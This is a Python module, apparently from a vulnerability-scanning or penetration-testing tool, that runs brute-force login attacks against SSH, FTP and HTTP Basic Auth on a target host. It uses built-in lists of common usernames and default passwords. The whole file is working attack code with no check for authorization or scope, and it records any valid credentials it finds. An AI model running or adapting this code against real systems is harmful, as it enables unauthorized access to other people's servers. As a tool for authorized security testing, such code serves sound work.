import socket
import base64
import yaml
import os

try:
    import requests
except ImportError:
    requests = None

try:
    import paramiko
except ImportError:
    paramiko = None

try:
    import ftplib
except ImportError:
    ftplib = None

def load_brute_force_passwords():
    """Load passwords specifically for brute force attacks"""
    try:
        yaml_path = os.path.join(os.path.dirname(__file__), '..', '..', 'data', 'default_passwords.yaml')
        with open(yaml_path, 'r', encoding='utf-8') as f:
            password_data = yaml.safe_load(f)
        
        return {
            'ssh': password_data.get('ssh', []) + password_data.get('linux', []) + password_data.get('common', []),
            'ftp': password_data.get('ftp', []) + password_data.get('common', []),
            'http': password_data.get('web_admin', []) + password_data.get('common', [])
        }
    except:
        # Fallback passwords
        return {
            'ssh': ['admin', 'root', 'user', 'guest', 'ubuntu', 'centos'],
            'ftp': ['admin', 'ftp', 'anonymous', 'user', 'guest'],
            'http': ['admin', 'password', 'admin123', 'welcome']
        }

def try_ssh_brute(target, port, usernames, passwords):
    results = []
    if not paramiko:
        return [{
            "service": "SSH",
            "port": port,
            "status": "error",
            "details": "paramiko module not available. Install with: pip install paramiko"
        }]
    
    for user in usernames:
        for pwd in passwords:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target, port=port, username=user, password=pwd, timeout=3)
                ssh.close()
                results.append({
                    "service": "SSH",
                    "port": port,
                    "user": user,
                    "password": pwd,
                    "status": "success",
                    "details": "Valid SSH credentials found!"
                })
            except paramiko.AuthenticationException:
                results.append({
                    "service": "SSH",
                    "port": port,
                    "user": user,
                    "password": pwd,
                    "status": "failed",
                    "details": "Authentication failed"
                })
            except Exception as e:
                results.append({
                    "service": "SSH",
                    "port": port,
                    "user": user,
                    "password": pwd,
                    "status": "error",
                    "details": str(e)
                })
    return results

def try_ftp_brute(target, port, usernames, passwords):
    results = []
    if not ftplib:
        return [{
            "service": "FTP",
            "port": port,
            "status": "error",
            "details": "ftplib module not available"
        }]
    
    for user in usernames:
        for pwd in passwords:
            try:
                ftp = ftplib.FTP()
                ftp.connect(target, port, timeout=3)
                ftp.login(user, pwd)
                ftp.quit()
                results.append({
                    "service": "FTP",
                    "port": port,
                    "user": user,
                    "password": pwd,
                    "status": "success",
                    "details": "Valid FTP credentials found!"
                })
            except ftplib.error_perm:
                results.append({
                    "service": "FTP",
                    "port": port,
                    "user": user,
                    "password": pwd,
                    "status": "failed",
                    "details": "Authentication failed"
                })
            except Exception as e:
                results.append({
                    "service": "FTP",
                    "port": port,
                    "user": user,
                    "password": pwd,
                    "status": "error",
                    "details": str(e)
                })
    return results

def try_http_basic_brute(target, port, usernames, passwords):
    results = []
    if not requests:
        return results
    url = f"http://{target}:{port}/"
    for user in usernames:
        for pwd in passwords:
            try:
                resp = requests.get(url, auth=(user, pwd), timeout=3)
                if resp.status_code == 200:
                    results.append({
                        "service": "HTTP Basic Auth",
                        "port": port,
                        "user": user,
                        "password": pwd,
                        "status": "success",
                        "details": "Valid credentials found!"
                    })
                else:
                    results.append({
                        "service": "HTTP Basic Auth",
                        "port": port,
                        "user": user,
                        "password": pwd,
                        "status": "failed",
                        "details": f"HTTP status {resp.status_code}"
                    })
            except Exception as e:
                results.append({
                    "service": "HTTP Basic Auth",
                    "port": port,
                    "user": user,
                    "password": pwd,
                    "status": "error",
                    "details": str(e)
                })
    return results

def run_brute_force_attack(target):
    """
    Attempt brute-force attacks on common services using comprehensive password lists.
    """
    password_lists = load_brute_force_passwords()
    usernames = ["admin", "root", "user", "test", "guest", "administrator"]
    brute_force_results = []

    # SSH with targeted passwords
    ssh_passwords = password_lists['ssh'][:20]  # Limit to 20 passwords
    brute_force_results.extend(try_ssh_brute(target, 22, usernames, ssh_passwords))

    # FTP with targeted passwords  
    ftp_passwords = password_lists['ftp'][:20]
    brute_force_results.extend(try_ftp_brute(target, 21, usernames, ftp_passwords))

    # HTTP with targeted passwords
    http_passwords = password_lists['http'][:20]
    for port in [80, 8080, 8000, 443]:
        brute_force_results.extend(try_http_basic_brute(target, port, usernames, http_passwords))

    return {
        "brute_force_results": brute_force_results,
        "summary": f"Comprehensive brute-force attacks attempted for {target} using targeted password lists."
    }
